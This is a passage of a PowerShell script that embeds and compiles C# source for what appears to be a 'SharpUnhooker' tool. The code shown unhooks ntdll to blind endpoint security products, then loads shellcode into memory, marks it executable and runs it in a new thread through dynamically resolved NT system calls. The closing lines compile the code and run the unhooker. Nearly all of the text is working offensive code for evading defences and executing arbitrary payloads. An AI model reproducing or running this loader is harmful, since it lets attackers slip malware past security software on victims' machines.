        STANDARD_RIGHTS_ALL = 0x001F0000,
        SPECIFIC_RIGHTS_ALL = 0x0000FFF,
        ACCESS_SYSTEM_SECURITY = 0x01000000,
        MAXIMUM_ALLOWED = 0x02000000,
        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        SECTION_ALL_ACCESS = 0x10000000,
        SECTION_QUERY = 0x0001,
        SECTION_MAP_WRITE = 0x0002,
        SECTION_MAP_READ = 0x0004,
        SECTION_MAP_EXECUTE = 0x0008,
        SECTION_EXTEND_SIZE = 0x0010
    };

    public enum NTSTATUS : uint {
        Success = 0x00000000,
        Wait0 = 0x00000000,
        Wait1 = 0x00000001,
        Wait2 = 0x00000002,
        Wait3 = 0x00000003,
        Wait63 = 0x0000003f,
        Abandoned = 0x00000080,
        AbandonedWait0 = 0x00000080,
        UserApc = 0x000000c0,
        KernelApc = 0x00000100,
        Alerted = 0x00000101,
        Timeout = 0x00000102,
        Pending = 0x00000103,
        Reparse = 0x00000104,
        MoreEntries = 0x00000105,
        NotAllAssigned = 0x00000106,
        SomeNotMapped = 0x00000107,
        Informational = 0x40000000,
        ObjectNameExists = 0x40000000,
        ThreadWasSuspended = 0x40000001,
        ImageNotAtBase = 0x40000003,
        Warning = 0x80000000,
        GuardPageViolation = 0x80000001,
        DatatypeMisalignment = 0x80000002,
        Breakpoint = 0x80000003,
        SingleStep = 0x80000004,
        BufferOverflow = 0x80000005,
        NoMoreFiles = 0x80000006,
        Error = 0xc0000000,
        Unsuccessful = 0xc0000001,
        NotImplemented = 0xc0000002,
        InvalidInfoClass = 0xc0000003,
        InfoLengthMismatch = 0xc0000004,
        AccessViolation = 0xc0000005,
        InPageError = 0xc0000006,
        InvalidHandle = 0xc0000008,
        InvalidParameter = 0xc000000d,
        NoSuchDevice = 0xc000000e,
        NoSuchFile = 0xc000000f,
        EndOfFile = 0xc0000011,
        NoMemory = 0xc0000017,
        ConflictingAddresses = 0xc0000018,
        AccessDenied = 0xc0000022,
        BufferTooSmall = 0xc0000023,
        ObjectTypeMismatch = 0xc0000024,
        ObjectNameInvalid = 0xc0000033,
        ObjectNameNotFound = 0xc0000034,
        ObjectNameCollision = 0xc0000035,
        ObjectPathInvalid = 0xc0000039,
        ObjectPathNotFound = 0xc000003a,
        DllNotFound = 0xc0000135,
        EntryPointNotFound = 0xc0000139,
        PrivilegeNotHeld = 0xc0000061,
        ProcessIsProtected = 0xc0000712,
        MaximumNtStatus = 0xffffffff
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate NTSTATUS NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate NTSTATUS NtCreateThreadExDelegate(out IntPtr threadHandle, ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate NTSTATUS NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate NTSTATUS NtWaitForSingleObjectDelegate(IntPtr Handle, bool Alertable, IntPtr Timeout);

    public static void UsageExample(byte[] ShellcodeBytes) {
        // First, unhook everything
        SharpUnhooker26H1.Main();
        
        IntPtr ntdll = Dynavoke.GetNTDLLBase();
        IntPtr ProcessHandle = new IntPtr(-1);
        IntPtr ShellcodeBytesLength = new IntPtr(ShellcodeBytes.Length);
        IntPtr AllocationAddress = new IntPtr();
        IntPtr ZeroBitsThatZero = IntPtr.Zero;
        UInt32 AllocationTypeUsed = (UInt32)AllocationType.Commit | (UInt32)AllocationType.Reserve;
        
        Console.WriteLine("[*] Allocating memory...");
        IntPtr pNtAlloc = Dynavoke.GetExportAddress(ntdll, "NtAllocateVirtualMemory");
        var ntAlloc = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(pNtAlloc, typeof(NtAllocateVirtualMemoryDelegate));
        ntAlloc(ProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref ShellcodeBytesLength, AllocationTypeUsed, 0x04);
        
        Console.WriteLine("[*] Copying payload...");
        Marshal.Copy(ShellcodeBytes, 0, AllocationAddress, ShellcodeBytes.Length);
        
        Console.WriteLine("[*] Changing memory protection...");
        UInt32 oldProtect = 0;
        IntPtr pNtProtect = Dynavoke.GetExportAddress(ntdll, "NtProtectVirtualMemory");
        var ntProtect = (NtProtectVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(pNtProtect, typeof(NtProtectVirtualMemoryDelegate));
        ShellcodeBytesLength = new IntPtr(ShellcodeBytes.Length);
        ntProtect(ProcessHandle, ref AllocationAddress, ref ShellcodeBytesLength, 0x20, ref oldProtect);
        
        IntPtr threadHandle = new IntPtr(0);
        ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL;
        IntPtr pObjectAttributes = new IntPtr(0);
        IntPtr lpParameter = new IntPtr(0);
        bool bCreateSuspended = false;
        int stackZeroBits = 0;
        int sizeOfStackCommit = 0xFFFF;
        int sizeOfStackReserve = 0xFFFF;
        IntPtr pBytesBuffer = new IntPtr(0);
        
        Console.WriteLine("[*] Creating thread...");
        IntPtr pNtCreateThread = Dynavoke.GetExportAddress(ntdll, "NtCreateThreadEx");
        var ntCreateThread = (NtCreateThreadExDelegate)Marshal.GetDelegateForFunctionPointer(pNtCreateThread, typeof(NtCreateThreadExDelegate));
        ntCreateThread(out threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
        
        Console.WriteLine("[+] Thread created with handle {0}!", threadHandle.ToString("X4"));
        
        // Wait for thread
        IntPtr pNtWait = Dynavoke.GetExportAddress(ntdll, "NtWaitForSingleObject");
        var ntWait = (NtWaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(pNtWait, typeof(NtWaitForSingleObjectDelegate));
        ntWait(threadHandle, false, IntPtr.Zero);
    }
}
"@

Add-Type -TypeDefinition $Source -Language CSharp

# Execute the unhooker
[SharpUnhooker26H1]::Main()
